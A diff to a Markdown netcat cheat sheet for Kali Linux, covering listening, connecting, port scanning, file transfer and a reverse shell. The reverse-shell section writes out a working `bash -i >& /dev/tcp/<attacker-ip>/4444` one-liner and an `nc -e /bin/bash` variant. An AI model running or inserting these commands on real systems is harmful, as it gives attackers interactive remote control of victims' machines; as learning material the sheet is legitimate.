@@ -23,15 +23,15 @@ Recommended OS: Kali Linux
 
 ## Netcat Commands
 
-- **Listen on port**:  `nc -lvp 1234`
+- **Listen on port**:  `nc -lvp 1234` (l-listning, v-verbose, p-port)
 - **Connect to host**:  `nc <hostname or IP> 1234`
 - **Scan for certain ports in a range**: `nc -zv <hostname> 1-100`
 - **Send file**:  
-  1. Receiver (opens port & prepares to save file):  `nc -l 12345 > received_file.txt`  
+  1. Receiver (opens port & prepares to save file):  `nc -lvp 12345 > received_file.txt`  
   2. Sender (connects & sends file to receiver’s IP):  `nc <receiver_ip> 12345 < my_file.txt`
 - **Reverse Shell**:  
-  1. Attacker (listens for connection)::  `nc -lvp 4444`  
-  2. Victim (connects & gives interactive shell to attacker):  `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1`
+  1. Sender/Attacker (listens for connection)::  `nc -lvp 4444`  
+  2. Receiver/Victim (connects & gives interactive shell to attacker):  `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1`
   - Note: On some systems use `nc -l -p 1234 -e /bin/bash`  
 
 ---
